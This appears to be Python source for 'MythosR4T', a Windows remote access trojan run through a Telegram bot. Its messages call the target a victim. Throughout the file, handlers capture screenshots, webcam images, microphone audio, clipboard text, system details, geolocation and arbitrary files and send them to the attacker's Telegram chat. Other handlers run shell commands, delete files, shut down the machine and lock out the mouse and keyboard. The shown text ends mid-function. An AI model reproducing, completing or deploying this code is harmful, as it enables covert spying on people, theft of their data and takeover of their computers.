# Author        : myth-dev
# GitHub        : https://github.com/mython-dev/
# Instagram     : @thehackerworld_ && @ myth.dev_
# Telegram      : @myth_dev
# Date          : 06.30.2023
# Main Language : Python
# Version RAT   : MythosR4T 1.0


import os
import psutil
import platform
import socket
import subprocess
import urllib.request
import ctypes
import getpass
import time
import requests
import pyaudio
import wave
from threading import Thread
import keyboard
import pyperclip
import pyautogui
from pynput.mouse import Controller
from pynput.keyboard import Listener
from comtypes import CLSCTX_ALL
from ctypes import cast, POINTER
from PIL import ImageGrab
import cv2
import win32com.client
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from libs.config import TOKEN, ID
from libs.logo import LOGO
from aiogram import Bot, Dispatcher, types
from aiogram.types import InputFile
import json
import webbrowser



bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2

USER_NAME = getpass.getuser()

#                               *************************************************
#                               #        COMMAND SHUTDOWN and REBOOT!!!         #
#                               ************************************************* 

async def reboot_command(message: types.Message):
        try:
            await bot.send_message(chat_id=ID, text='–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞—é –ø–∫...')
            os.system('shutdown /r /t 0')
        except Exception as e:
            await bot.send_message(chat_id=ID, text=e)


async def shutdown_command(message: types.Message):
        try:
            await bot.send_message(chat_id=ID, text='–í—ã–∫–ª—é—á–∞—é –ø–∫...')
            os.system('shutdown /s /t 0')
        except Exception as e:
            await bot.send_message(chat_id=ID, text=e)

#                               *************************************************
#                               #               COMMAND DRIVER!!!               #
#                               ************************************************* 

async def driver_command(message: types.Message):
    wmi = win32com.client.GetObject("winmgmts:")
    drivers = wmi.ExecQuery("SELECT * FROM Win32_PnPSignedDriver")

    with open('drivers.txt', 'w', encoding='utf-8') as f:
        f.write(LOGO)
        for driver in drivers:
            f.write(f"–ò–º—è: {driver.DeviceName}\n"
                    f"–ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å: {driver.Manufacturer}\n"
                    f"–í–µ—Ä—Å–∏—è –¥—Ä–∞–π–≤–µ—Ä–∞: {driver.DriverVersion}\n"
                    f"–î–∞—Ç–∞ –¥—Ä–∞–π–≤–µ—Ä–∞: {driver.DriverDate}\n\n")

    with open('drivers.txt', 'rb') as f:
        await bot.send_document(ID, InputFile(f), caption='–õ–æ–≤–∏—Ç–µ... –°–ø–∏—Å–æ–∫ –¥—Ä–∞–π–≤–µ—Ä–æ–≤')

    os.remove('drivers.txt')

#                               *************************************************
#                               #                  COMMAND KILL!!!              #
#                               ************************************************* 

async def kill_command(message: types.Message):
    
    if 5 == len(message.text):
        await bot.send_message(chat_id=ID, text='–û—Ç–ø—Ä–∞–≤—Ç–µ id, –ü—Ä–∏–º–µ—Ä: /kill 1234')
    else:
        try:
            process_id = int(message.text.split()[1])
            process = psutil.Process(process_id)
            process.terminate()
            await bot.send_message(chat_id=ID, text=f"–ü—Ä–æ—Ü–µ—Å—Å {process_id} —É—Å–ø–µ—à–Ω–æ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.")
        except (IndexError, psutil.NoSuchProcess):
            await bot.send_message(chat_id=ID, text=f"–ü—Ä–æ—Ü–µ—Å—Å {process_id} –Ω–µ –Ω–∞–π–¥–µ–Ω.")
        except psutil.AccessDenied:
            await bot.send_message(chat_id=ID, text=f'–ù–µ –ø–æ–ª—É—á–∏–ª–æ—Å—å –æ—Å—Ç–∞–Ω–æ–≤–∏—Ç –ø—Ä–æ—Ü–µ—Å—Å {process_id}, –û—à–∏–±–∫–∞: "psutil.AccessDenied" –¥–æ—Å—Ç—É–ø –∫ —ç—Ç–æ–º—É –ø—Ä–æ—Ü–µ—Å—Å—É –∑–∞–ø—Ä–µ—â—ë–Ω.')

#                               *************************************************
#                               #               COMMAND SYS INFO!!!             #
#                               ************************************************* 

def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


async def sysinfo_command(message: types.Message):
    cpu_usage = psutil.cpu_percent()
    mem_usage = psutil.virtual_memory().percent
    disk_usage = psutil.disk_usage('/').percent
    countofcpu = psutil.cpu_count(logical=True)
    uname = platform.uname()
    local_ip = None
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
    svmem = psutil.virtual_memory()

    await bot.send_message(chat_id=ID, text=
            f"–ò–º—è –ø–∫: {str(uname.node)}\n"
            f"–Æ–∑–µ—Ä: {os.getlogin()}\n"
            f"–°–∏—Å—Ç–µ–º–∞: {platform.system()}\n"
            f"–ê—Ä—Ö–∏—Ç–∏–∫—Ç—É—Ä–∞: {platform.machine()()}\n"
            f"–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä (CPU): {cpu_usage}% / 100.0%\n"
            f"–û–ø–µ—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–º—è—Ç—å (RAM): –ì–ë {str(get_size(svmem.total))}, {mem_usage}% / 100.0%\n"
            f"–û–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —è–¥–µ—Ä –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞: {str(countofcpu)}\n"
            f"–õ–æ–∫–∞–ª—å–Ω—ã–π IP: {local_ip}\n"
            f"–ì–ª–æ–±–∞–ª—å–Ω—ã–π IP: {external_ip}")
            
    output = subprocess.check_output(f'systeminfo', encoding='oem')
    partitions = psutil.disk_partitions()
    with open('sysinfo.txt', 'w', encoding='utf-8') as f:
        f.write(LOGO)
        f.write(output)
        for partition in partitions:
            f.write("\n–î–∏—Å–∫: " + str(partition.device))
            f.write("\n–ò–º—è –¥–∏—Å–∫–∞: " + str(partition.mountpoint))
            f.write("\n–¢–∏–ø —Ñ–∞–π–ª–æ–≤–æ–π —Å–∏—Å—Ç–µ–º—ã: " + str(partition.fstype))
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
            except PermissionError:
                continue
            f.write("\n–û–±—â–∞—è –ø–∞–º—è—Ç—å: " + str(get_size(partition_usage.total)))
            f.write("\n–ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è: " + str(get_size(partition_usage.used)))
            f.write("\n–°–≤–æ–±–æ–¥–Ω–æ: " + str(get_size(partition_usage.free)))
                        
    with open('sysinfo.txt', 'rb') as f:
        await bot.send_document(ID, InputFile(f), caption='–õ–æ–≤–∏—Ç–µ... –ü–æ–¥—Ä–æ–±–Ω—ã–π —Å–ø–∏—Å–æ–∫.')

    os.remove('sysinfo.txt')

#                               *************************************************
#                               #             COMMAND TASK LIST!!!              #
#                               ************************************************* 

@dp.message_handler(commands=['tasklist'])
async def tasklist_command(message: types.Message):
    await bot.send_chat_action(chat_id=message.chat.id, action=types.ChatActions.TYPING)
    output = subprocess.check_output(['tasklist']).decode('cp866')

    filename = 'tasklist.txt'
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(LOGO)
        f.write(output)  

    with open(filename, 'rb') as f:
        await bot.send_document(ID, InputFile(f), caption='–õ–æ–≤–∏—Ç–µ...')
    os.remove(filename) 

#                               *************************************************
#                               #               COMMAND MONITORS!!!             #
#                               ************************************************* 

async def send_list_monitor(message: types.Message):
    mon_list = subprocess.check_output(["powershell.exe", "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"], encoding='utf-8')
    await bot.send_message(chat_id=ID, text=mon_list.encode())

#                               *************************************************
#                               #            COMMAND TURN OFF MONITOR!!!        #
#                               ************************************************* 

async def turnoffmon_command(message: types.Message):
    try:
        user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
        await bot.send_message(chat_id=ID, text='–£—Å–ø–µ—à–Ω–æ! –≤—ã–∫–ª—é—á–∏–ª –º–æ–Ω–∏—Ç–æ—Ä —É –∂–µ—Ä—Ç–≤—ã üòÜüòÜ)))')
    except Exception as e: 
        await bot.send_message(chat_id=ID, text=f'–ù–µ –ø–æ–ª—É—á–∏–ª–æ—Å—å –≤—ã–∫–ª—é—á–∏—Ç—å –º–æ–Ω–∏—Ç–æ—Ä —É –∂–µ—Ä—Ç—ã...–û—à–∏–±–∫–∞: {e}') 

#                               *************************************************
#                               #            COMMAND TURN ON MONITOR!!!         #
#                               ************************************************* 

async def turnonmon_command(message: types.Message):
    try:
        user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
        await bot.send_message(chat_id=ID, text='–£—Å–ø–µ—à–Ω–æ! –≤–∫–ª—é—á–∏–ª –º–æ–Ω–∏—Ç–æ—Ä —É –∂–µ—Ä—Ç–≤—ã.')
    except Exception as e: 
        await bot.send_message(chat_id=ID, text=f'–ù–µ –ø–æ–ª—É—á–∏–ª–æ—Å—å –≤–∫–ª—é—á–∏—Ç—å –º–æ–Ω–∏—Ç–æ—Ä —É –∂–µ—Ä—Ç—ã...\n–û—à–∏–±–∫–∞: {e}')

#                               *************************************************
#                               #             COMMAND VOLUME UP!!!              #
#                               ************************************************* 

async def volumeup_command(message: types.Message):
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        if volume.GetMute() == 1:
            volume.SetMute(0, None)
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
        await bot.send_message(chat_id=ID, text="–ì—Ä–æ–º–∫–æ—Å—Ç—å —É—Å–ø–µ—à–Ω–æ —É–≤–µ–ª–∏—á–µ–Ω–∞ –¥–æ 100%")
    except Exception as e:
        await bot.send_message(chat_id=ID, text=f'–ù–µ –ø–æ–ª—É—á–∏–ª–æ—Å—å —É–≤–µ–ª–∏—á–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å –¥–æ 100%\n–û—à–∏–±–∫–∞: {e}')

#                               *************************************************
#                               #              COMMAND VOLUME DOWN!!!           #
#                               ************************************************* 

async def volumedown_command(message: types.Message):
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
        await bot.send_message(chat_id=ID, text="–ì—Ä–æ–º–∫–æ—Å—Ç—å —É—Å–ø–µ—à–Ω–æ —É–º–µ–Ω—à–∏–ª–∞—Å—å –¥–æ 0%")
    except Exception as e:
        await bot.send_message(chat_id=ID, text=f'–ù–µ –ø–æ–ª—É—á–∏–ª–æ—Å—å —É–º–µ–Ω—à–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å –¥–æ 0%\n–û—à–∏–±–∫–∞: {e}')

#                               *************************************************
#                               #             COMMAND SEND MESSAGE!!!           #
#                               ************************************************* 

async def sendmessage_command(message: types.Message):
    if len(message.text) == 12:
        await bot.send_message(chat_id=ID, text='–í–æ—Ç –ø—Ä–∏–º–µ—Ä —Ä–∞–±–æ—Ç—ã: /sendmessage –°–æ–æ–±—â–µ–Ω–∏–µ')
    else:
        try:
            text = ' '.join([str(elem) for elem in message.text.split()])
            text1 = text.replace('/sendmessage ', '')
            time.sleep(1)
            await bot.send_message(chat_id=ID, text='–Ø –æ—Ç–ø—Ä–∞–≤–ª—é —Å–∫—Ä–∏–Ω—à–æ—Ç —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ —Ç–æ–≥–æ, –∫–∞–∫ –≤–∞—à–∞ –∂–µ—Ä—Ç–≤–∞ –ø—Ä–æ—á—Ç–µ—Ç –≤–∞—à–µ —Å–æ–æ–±—â–µ–Ω–∏–µ.')
            user32.MessageBoxW(0, text1, '–í–∞–∂–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è!', 0x00000000 | 0x00000040)
            screen = ImageGrab.grab()
            screen.save('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg')
            f = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg',"rb")
            await bot.send_message(chat_id=ID, text='–ü–æ–¥–∞–∂–¥–∏—Ç–µ –æ—Ç–ø—Ä–∞–≤–ª—è—é —Å–∫—Ä–∏–Ω.')
            await bot.send_photo(ID, InputFile(f))
        except Exception as e:
            await bot.send_message(chat_id=ID, text=f'–û—à–∏–±–∫–∞: {e}')

#                               *************************************************
#                               #            COMMAND SET WALLPAPER!!!           #
#                               ************************************************* 

async def setwallpaper_command(message: types.Message):
    if len(message.text) == 13:
        await bot.send_message(chat_id=ID, text='–û—Ç–ø—Ä–∞–≤—å—Ç–µ –ø—É—Ç—å –æ–±–æ—é. –ü—Ä–∏–º–µ—Ä: /setwallpaper /home/user/oboy.png')
    else:
        try:
            path = message.text.split('/')[1]
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
            await bot.send_message(chat_id=ID, text='–£—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–∏–ª –æ–±–æ–π.')
        except Exception as e:
            await bot.send_message(chat_id=ID, text=f'–ù–µ –ø–æ–ª—É—á–∏–ª–æ—Å—å —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –æ–±–æ–π\n–û—à–∏–±–∫–∞: {e}')

#                               *************************************************
#                               #              COMMAND OPEN lINK!!!             #
#                               ************************************************* 

async def open_link_command(message: types.Message):
    if len(message.text) == 10:
         await bot.send_message(chat_id=ID, text='–í–æ—Ç –ø—Ä–∏–º–µ—Ä —Ä–∞–±–æ—Ç—ã: /open_link https://google.com/')
    else:
        try:
            await bot.send_message(chat_id=ID, text='–ö–æ–º–∞–Ω–¥–∞ –ø—Ä–∏–Ω—è—Ç–∞, –æ–∂–∏–¥–∞–π—Ç–µ, –æ—Ç–∫–ª–∏–∫ –±–æ—Ç–∞, –∑–∞–≤–∏—Å–∏—Ç –æ—Ç —Å–∫–æ—Ä–æ—Å—Ç–∏ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞ –∂–µ—Ä—Ç–≤—ã')
            webbrowser.open_new(message.text.split()[1])
            time.sleep(3)
            screen = ImageGrab.grab()
            screen.save('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg')
            f = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg',"rb")
            await bot.send_photo(ID, InputFile(f))
            try:
                os.remove('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming' + '\\sreenshot.jpg')
            except Exception as e:
                    bot.send_message(message.chat.id, '–°–∫—Ä–∏–Ω—à–æ—Ç —Å–¥–µ–ª–∞—Ç—å —É–¥–∞–ª–æ—Å—å, –Ω–æ –Ω–µ –ø–æ–ª—É—á–∏–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç –ø–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏:(\n–ö–æ–¥ –æ—à–∏–±–∫–∏:\n' + str(e))
                    bot.send_message(message.chat.id, '–£—Å–ø–µ—à–Ω–æ –æ—Ç–∫—Ä—ã—Ç–∞ —Å—Å—ã–ª–∫–∞! –í–æ—Ç —Å–∫—Ä–∏–Ω—à–æ—Ç')
        except Exception as e:
            bot.send_message(message.chat.id, '–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É, –∏—Å–ø–æ–ª—å–∑—É–π —Ç–∞–∫–æ–π —Ñ–æ—Ä–º–∞—Ç: /open_link https://—Å—Å—ã–ª–∫–∞\n–ö–æ–¥ –æ—à–∏–±–∫–∏:\n' + str(e))

#                               *************************************************
#                               #                  COMMAND PWD!!!               #
#                               ************************************************* 

async def pwd_command(message: types.Message):
    pwd = str(os.getcwd())
    await bot.send_message(chat_id=ID, text=f'–¢–µ–∫—É—â–∞—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è: {pwd}')

#                               *************************************************
#                               #                  COMMAND CD!!!                #
#                               ************************************************* 

async def cd_command(message: types.Message):
    if message.text == 2:
        await bot.send_message(chat_id=ID, text='–í–æ—Ç –ø—Ä–∏–º–µ—Ä —Ä–∞–±–æ—Ç—ã: /cd /home/user/Desktop')
    else:
        try:
            text = ' '.join([str(elem) for elem in message.text.split()])
            text1 = text.replace('/cd ', '')
            os.chdir(text1)
            await bot.send_message(chat_id=ID, text='–£—Å–ø–µ—à–Ω–æ —Ç–µ–ø–µ—Ä—å –º—ã –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏: ' + str(os.getcwd()))
        except Exception as e:
            await bot.send_message(chat_id=ID, text=f'–ù–µ –ø–æ–ª—É—á–∏–ª–æ—Å—å –ø–µ—Ä–µ–π—Ç–∏ –Ω–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é {text1}\n–û—à–∏–±–∫–∞: {e}')

#                               *************************************************
#                               #                  COMMAND DIR!!!               #
#                               ************************************************* 

async def dir_command(message: types.Message):
    try:
        output = subprocess.check_output(["dir"], shell=True)
        output = output.decode(encoding='utf8', errors='ignore')
        await bot.send_message(chat_id=ID, text=f'{output}')
    except Exception as e:
        await bot.send_message(chat_id=ID, text=f'–ù–µ –ø–æ–ª—É—á–∏–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É\n–û—à–∏–±–∫–∞: {e}')

#                               *************************************************
#                               #              COMMAND MAKEDIR!!!                #
#                               ************************************************* 

async def makedir_command(message: types.Message):
    if len(message.text) == 8:
        await bot.send_message(chat_id=ID, text=f'–í–æ—Ç –ø—Ä–∏–º–µ—Ä —Ä–∞–±–æ—Ç—ã: /makedir namedir')
    else:
        try:
            name_dir = message.text.split()[1]
            os.mkdir(name_dir)
            await bot.send_message(chat_id=ID, text=f'–£—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–ª –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é: {name_dir}')
        except Exception as e:
            await bot.send_message(chat_id=ID, text=f'–û—à–∏–±–∫–∞: {e}')

#                               *************************************************
#                               #              COMMAND RMDIR!!!                 #
#                               ************************************************* 

async def rmdir_command(message: types.Message):
    if len(message.text) == 6:
        await bot.send_message(chat_id=ID, text='–í–æ—Ç –ø—Ä–∏–º–µ—Ä —Ä–∞–±–æ—Ç—ã: /rmdir namedir')
    else:
        try:
            name_dir = message.text.split()[1]
            os.rmdir(name_dir)
            await bot.send_message(chat_id=ID, text=f'–£—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–∏–ª –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é: {name_dir}')
        except Exception as e:
            await bot.send_message(chat_id=ID, text=f'–û—à–∏–±–∫–∞: {e}')


#                               *************************************************
#                               #              COMMAND RMFILE!!!                #
#                               ************************************************* 

async def rmfile_command(message: types.Message):
    if len(message.text) == 7:
        await bot.send_message(chat_id=ID, text='–í–æ—Ç –ø—Ä–∏–º–µ—Ä —Ä–∞–±–æ—Ç—ã: /rmfile filename.txt')
    else:
        try:
            file_name = message.text()[1]
            os.remove(file_name)
            await bot.send_message(chat_id=ID, text=f'–£—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–∏–ª —Ñ–∞–π–ª: {file_name}')
        except Exception as e:
            await bot.send_message(chat_id=ID, text=f'–û—à–∏–±–∫–∞: {e}')

#                               *************************************************
                                #              COMMAND SEARCHFILE!!!            #
#                               ************************************************* 

async def searchfile_command(message: types.Message):
    try:
        # –ø–æ–ª—É—á–∞–µ–º –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ –∏–∑ —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        file_name = message.text.split()[1]
        # –∏—â–µ–º —Ñ–∞–π–ª –≤ —Ç–µ–∫—É—â–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –∏ –≤—Å–µ—Ö –ø–æ–¥–¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è—Ö
        for root, dirs, files in os.walk('.'):
            if file_name in files:
                # –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–∞–π–ª –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
                with open(os.path.join(root, file_name), 'rb') as f:
                    await bot.send_document(ID, InputFile(f))
                    break
            else:
                await bot.send_message(chat_id=ID, text=f'–§–∞–π–ª {file_name} –Ω–µ –Ω–∞–π–¥–µ–Ω')
    except IndexError:
        await bot.send_message(chat_id=ID, text='–í—ã –Ω–µ —É–∫–∞–∑–∞–ª–∏ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞\n–í–æ—Ç –ø—Ä–∏–º–µ—Ä —Ä–∞–±–æ—Ç—ã: /searchfile myth_dev.txt')

    except Exception as e:
        await bot.send_message(chat_id=ID, text=f'–û—à–∏–±–∫–∞: {e}')

#                               *************************************************
#                               #              COMMAND SCREENSHOT!!!            #
#                               ************************************************* 

async def screenshot_command(message: types.Message):
    try:
        screen = ImageGrab.grab()
        screen.save('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg')
        f = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg',"rb")
        await bot.send_photo(ID, InputFile(f))
    except Exception as e:
        await bot.send_message(chat_id=ID, text=f'–û—à–∏–±–∫–∞: {e}')
    try:
        os.remove('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\sreenshot.png')
    except:
        pass

#                               *************************************************
#                               #             COMMAND WEBCAM SNAP!!!            #
#                               ************************************************* 

async def webcam_snap_command(message: types.Message):
    try:
        await bot.send_message(chat_id=ID, text='–ö–æ–º–∞–Ω–¥–∞ –ø—Ä–∏–Ω—è—Ç–∞, –æ–∂–∏–¥–∞–π—Ç–µ, –æ—Ç–∫–ª–∏–∫ –±–æ—Ç–∞, –∑–∞–≤–∏—Å–∏—Ç –æ—Ç —Å–∫–æ—Ä–æ—Å—Ç–∏ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞ –∂–µ—Ä—Ç–≤—ã')
        cap = cv2.VideoCapture(0)
        for i in range(30):
            cap.read()
        ret, frame = cap.read()
        cv2.imwrite(os.getenv("APPDATA") + '\\4543t353454.png', frame)   
        cap.release()
        webcam = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\4543t353454.png','rb')
        await bot.send_photo(ID, InputFile(webcam))
        try:
            os.remove('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\4543t353454.png')
        except:
            pass
    except:  
        await bot.send_message(chat_id=ID, text='–£ –∂–µ—Ä—Ç–≤—ã –Ω–µ—Ç—É –≤–µ–± –∫–∞–º–µ—Ä—ã.')    

#                               *************************************************
#                               #                COMMAND SHELL!!!               #
#                               ************************************************* 

async def shell(message: types.Message):
    if 6 == len(message.text):
        await bot.send_message(chat_id=ID, text='–í–æ—Ç –ø—Ä–∏–º–µ—Ä —Ä–∞–±–æ—Ç—ã: /shell <command>\n–†–∞–±–æ—Ç–∞–µ—Ç —Å –±–∞–≥–æ–º!!!')
    else:
        cmd = message.text.split(' ', 1)[1]
        try:
            result = subprocess.run(cmd, stdout=subprocess.PIPE, shell=True)
            await message.answer(result.stdout.decode('cp1251', errors='ignore').encode('utf-8', errors='ignore').decode('utf-8', errors='ignore'))
        except Exception as e:
            await bot.send_message(chat_id=ID, text=f'–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–µ–Ω–∏–Ω–µ –∫–æ–º–∞–Ω–¥—ã: {e}') 

#                               *************************************************
#                               #              COMMAND DOWNLOAD!!!              #
#                               ************************************************* 

async def download_file(message):
    if len(message.text) == 9:
        await bot.send_message(chat_id=ID, text=f'–í–æ—Ç –ø—Ä–∏–º–µ—Ä —Ä–∞–±–æ—Ç—ã: /download /path/to/file')
    else:
        try:
            await bot.send_message(chat_id=ID, text='–ö–æ–º–∞–Ω–¥–∞ –ø—Ä–∏–Ω—è—Ç–∞, –æ–∂–∏–¥–∞–π—Ç–µ, –æ—Ç–∫–ª–∏–∫ –±–æ—Ç–∞, –∑–∞–≤–∏—Å–∏—Ç –æ—Ç —Å–∫–æ—Ä–æ—Å—Ç–∏ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞ –∂–µ—Ä—Ç–≤—ã')
            text = ' '.join([str(elem) for elem in message.text.split()])
            text1 = text.replace('/download ', '')
            f = open(text1, 'rb')

            await bot.send_document(ID, InputFile(f))
        except Exception as e:
            await bot.send_message(chat_id=ID, text=f'–û—à–∏–±–∫–∞: {e}')

#                               *************************************************
#                               #              COMMAND GEOLOCATE!!!             #
#                               ************************************************* 

async def geolocate_command(message: types.Message):
    url = "http://ip-api.com/json/?fields=country,region,regionName,city,zip,lat,lon,timezone,query"
    request = requests.get(url)
    requestMap = json.loads(request.text)
    locationInfo = "IP address: {0}\nCity: {1}\nZip Code: {2}\nRegion: {3}\nCountry: {4}\nTimezone: {5}\nEst. Coordinates: {6}, {7}".format(requestMap["query"], requestMap["city"], str(requestMap["zip"]), requestMap["region"], requestMap["country"], requestMap["timezone"], str(requestMap["lat"]), str(requestMap["lon"]))
    await bot.send_message(chat_id=ID, text=f'{locationInfo}')

#                               *************************************************
#                               #              COMMAND AUDIO!!!                 #
#                               ************************************************* 

async def audio_command(message: types.Message):
    if len(message.text) == 6:
        await bot.send_message(chat_id=ID, text=f'–í–æ—Ç –ø—Ä–∏–º–µ—Ä —Ä–∞–±–æ—Ç—ã: /audio <secund zapiz audio>')
    
    else:

        try:
            secund = int(message.text.split()[1])
            duration = int(secund)
            duration *= 44

            audio = pyaudio.PyAudio()
            stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
            frames = []

            await bot.send_message(chat_id=ID ,text='–ó–∞–ø–∏—Å—å –∏–¥–µ—Ç....')

            for i in range(1, duration):
                data = stream.read(1024)
                frames.append(data)

            stream.stop_stream()
            stream.close()
            audio.terminate()
            sound_file = wave.open('audio.wav', 'wb')
            sound_file.setnchannels(1)
            sound_file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
            sound_file.setframerate(44100)
            sound_file.writeframes(b''.join(frames))
            sound_file.close()
            await bot.send_message(chat_id=ID, text='–û—Ç–ø—Ä–∞–≤–ª—è—é –∑–∞–ø–∏—Å—å!!!')
            await bot.send_document(ID, open('audio.wav', 'rb'))
            try:
                os.remove('audio.wav')
            except:
                pass
        except Exception as e:
            print(e)
            await bot.send_message(ID, text=f'–û—à–∏–±–∫–∞: {e}')

#                               *************************************************
#                               #       COMMAND DISABLE or ENABLE MOUSE!!!      #
#                               ************************************************* 


def disable_mouse():
    mouse = Controller()
    t_end = time.time() + 3600*24*11
    while time.time() < t_end and mousedbl == True:
        mouse.position = (0, 0)

async def disablemouse_command(message: types.Message):
    global mousedbl
    mousedbl = True
    Thread(target=disable_mouse, daemon=True).start()
    await bot.send_message(chat_id=ID, text="–ú—ã—à–∫–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∞. –ú–æ–∂–µ—Ç–µ –≤–∫–ª—é—á–∏—Ç—å —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—É /enablemouse")

async def enablemouse_command(message: types.Message):
    global mousedbl
    mousedbl = False
    await bot.send_message(chat_id=ID, text="–ú—ã—à—å –≤–∫–ª—é—á–µ–Ω–∞.")

#                               *************************************************
#                               #     COMMAND DISABLE or ENABLE KEYBOARD!!!     #
#                               ************************************************* 

def disable_keyboard():
    if kbrd == True:
        for i in range(150):
            if kbrd == True:
                keyboard.block_key(i)
                
        time.sleep(999999)

    elif kbrd == False:
        print('test')

async def disablekeyboard_command(message: types.Message):
        global kbrd
        kbrd = True
        Thread(target=disable_keyboard, daemon=True).start()
        await bot.send_message(chat_id=ID, text="–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∞, –ú–æ–∂–µ—Ç–µ –≤–∫–ª—é—á–∏—Ç—å —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—É /enablekeyboard")

async def enablekeyboard_command(message: types.Message):
    global kbrd
    kbrd = False
    await bot.send_message(chat_id=ID, text=f'–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –≤–∫–ª—é—á–µ–Ω–∞.') 

#                               *************************************************
#                               #               COMMAND CLIPBOARD!!!            #
#                               ************************************************* 

async def clipboard_command(message: types.Message):
    Buffer = pyperclip.paste()
    await bot.send_message(chat_id=ID, text=f'–ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞: {Buffer}')

#                               *************************************************
#                               #               COMMAND ALT + F4!!!             #
#                               ************************************************* 

async def f4(message: types.Message):
        try:
            msg = await bot.send_message(chat_id=ID, text='–©–∞—Å –∑–∞–∫—Ä–æ–µ–º –æ–∫–Ω–æ üåö')
            pyautogui.hotkey('alt','f4')
